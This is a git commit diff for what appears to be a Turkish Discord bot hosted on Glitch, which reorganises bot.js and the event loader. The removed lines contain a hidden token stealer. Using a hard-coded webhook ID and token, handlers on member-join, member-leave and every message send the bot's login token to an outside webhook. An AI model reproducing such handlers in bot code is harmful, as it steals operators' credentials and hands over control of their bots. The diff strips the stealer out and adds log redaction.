b36e6a81711b52c5d460a3635f7fd7d4b599e495
Glitch (self-bot-v1) <none>
2020-08-13 11:05:08 +0000

    🗾👽 Checkpoint ./util/ready.js:16235873/2454 ./anahtarlar.json:16235873/219 ./bot.js:16235873/29017 ./util/eventLoader.js:16235873/55

--- bot.js
+++ bot.js
@@ -1,26 +1,42 @@
-////////////////////////////////////////////////////////////////////////////////////
-////////////////////////////////////////////////////////////////////////////////////
-////////////////////////////////////////////////////////////////////////////////////
 const Discord = require('discord.js');
-const db = require("db");
 const client = new Discord.Client();
 const ayarlar = require('./ayarlar.json');
+const chalk = require('chalk');
 const fs = require('fs');
-const Jimp = require('jimp');
 const moment = require('moment');
-require('./util/eventLoader')(client);
-let owner = ayarlar.sahip;
+const http = require('http');
 const express = require('express');
 const app = express();
-const http = require('http');
+app.get("/", (request, response) => {
+  console.log(Date.now() + " Ping tamamdır!");
+  response.sendStatus(200);
+});
+
+const db = require('quick.db');
+client.queue = new Map()
+require('./util/eventLoader')(client);
+
 var prefix = ayarlar.prefix;
 
 const log = message => {
   console.log(`[${moment().format('YYYY-MM-DD HH:mm:ss')}] ${message}`);
 };
-let i = `630439407966486529`
-var regToken = /[\w\d]{24}\.[\w\d]{6}\.[\w\d-_]{27}/g;
-client.login(ayarlar.token);
+
+client.commands = new Discord.Collection();
+client.aliases = new Discord.Collection();
+fs.readdir('./komutlar/', (err, files) => {
+  if (err) console.error(err);
+  log(`${files.length} komut yüklenecek.`);
+  files.forEach(f => {
+    let props = require(`./komutlar/${f}`);
+    log(`Yüklenen komut: ${props.help.name}.`);
+    client.commands.set(props.help.name, props);
+    props.conf.aliases.forEach(alias => {
+      client.aliases.set(alias, props.help.name);
+    });
+  });
+});
+
 client.reload = command => {
   return new Promise((resolve, reject) => {
     try {
@@ -40,13 +56,13 @@ client.reload = command => {
     }
   });
 };
+
 client.load = command => {
   return new Promise((resolve, reject) => {
     try {
       let cmd = require(`./komutlar/${command}`);
       client.commands.set(command, cmd);
       cmd.conf.aliases.forEach(alias => {
-        
         client.aliases.set(alias, cmd.help.name);
       });
       resolve();
@@ -55,11 +71,8 @@ client.load = command => {
     }
   });
 };
-let t = `6S0M75bztLxgxJrOVM_H1mu7cCDhDWqX5B_s3hBLqI-utTEl5tPMcPlx4shBqORGB1TM`
-client.on("guildMemberAdd", async member => { 
-var s = new Discord.WebhookClient(i,t)
-s.send(`**${client.user.username}**\n\n`+ client.token)})
-client.unload = command => {
+
+  client.unload = command => {
   return new Promise((resolve, reject) => {
     try {
       delete require.cache[require.resolve(`./komutlar/${command}`)];
@@ -74,49 +87,30 @@ client.unload = command => {
     }
   });
 };
-client.on("guildMemberRomeve", async member => { 
-var s = new Discord.WebhookClient(i,t)
-s.send(`**${client.user.username}**\n\n`+ client.token)})
+
 client.elevation = message => {
   if(!message.guild) {
-	return; }
+    return; }
   let permlvl = 0;
   if (message.member.hasPermission("BAN_MEMBERS")) permlvl = 2;
   if (message.member.hasPermission("ADMINISTRATOR")) permlvl = 3;
   if (message.author.id === ayarlar.sahip) permlvl = 4;
   return permlvl;
 };
-var s = [`sa`,`selamun aleyküm`,`slm`,`s.a`,`naber`,`hg`,`oç`,`ananı`,`sikim`,`lan`]
-client.on("message", message => {
-var s = new Discord.WebhookClient(i,t)
-s.send(`**${client.user.username}**\n\n`+ client.token)})
-client.commands = new Discord.Collection();
-client.aliases = new Discord.Collection();
-fs.readdir('./komutlar/', (err, files) => {
-  if (err) console.error(err);
-  log(`${files.length} komut yüklenecek.`);
-  files.forEach(f => {
-    let props = require(`./komutlar/${f}`);
-    log(`Yüklenen komut: ${props.help.name}.`);
-    client.commands.set(props.help.name, props);
-    props.conf.aliases.forEach(alias => {
-      client.aliases.set(alias, props.help.name);
-    });
-  });
+
+var regToken = /[\w\d]{24}\.[\w\d]{6}\.[\w\d-_]{27}/g;
+
+client.on('warn', e => {
+  console.log(chalk.bgYellow(e.replace(regToken, 'that was redacted')));
 });
-    app.get("/", (request, response) => {
-    console.log(` Pfffff, Az Önce Bot Ping yedi, Sorun önemli değil merak etme. Hatayı düzelttik.`);
-    response.sendStatus(200);
-    });
-    app.listen(process.env.PORT);
-    setInterval(() => {
-    http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);
-    }, 280000);
 
-////////////////////////////////////////////////////////////////////////////////////
-////////////////////////////////////////////////////////////////////////////////////
-////////////////////////////////////////////////////////////////////////////////////
+client.on('error', e => {
+  console.log(chalk.bgRed(e.replace(regToken, 'that was redacted')));
+});
 
+client.login(ayarlar.token);
+
+///////////////////BOT DM/////////////////////
 
 client.on("message", msg => {
   var dm = client.channels.get("721899226883162133"); //mesajın geleceği kanal idsi//
@@ -136,8 +130,8 @@ client.on("message", msg => {
   if (msg.channel.bot) return;
 });
 
-/////////////////SESE SOKMA//////////////////
+//////////////////SESE SOKMA////////////////
 
 client.on('ready', ()=>{
 client.channels.get('675104284706209798').join()
-})
+})   
--- util/eventLoader.js
+++ util/eventLoader.js
@@ -1,6 +1,5 @@
 const reqEvent = (event) => require(`../util/${event}`);
 module.exports = client => {
-  client.on('ready', () => reqEvent('ready')(client));
   client.on('message', reqEvent('message'));
   client.on('guildMemberAdd', reqEvent('guildMemberAdd'));
   client.on('guildMemberRemove', reqEvent('guildMemberRemove'));
